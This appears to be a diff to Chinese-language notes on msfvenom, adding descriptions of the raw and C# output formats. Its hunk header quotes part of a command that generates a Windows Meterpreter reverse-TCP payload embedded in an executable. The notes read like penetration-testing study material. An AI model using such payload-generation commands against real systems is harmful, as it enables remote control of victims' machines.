@@ -97,11 +97,11 @@ Msfvenom --payload windows/meterpreter/reverse_tcp -platform windows -a x86 -x C
     * `-f jar`
     * ...
   * 可转换格式(便于自定义使用)
-    * `-f raw` 不指定-f时 默认输出格式
+    * `-f raw` 生成原生格式 不指定-f时的默认输出格式
     * `-f hex` 生成十六进制hex编码形式 如`\x0a`
     * `-f python`
     * `-f c`
-    * `-f csharp`
+    * `-f csharp` 生成C#代码
     * `-f powershell`
     * `-f bash`
     * `-f sh`
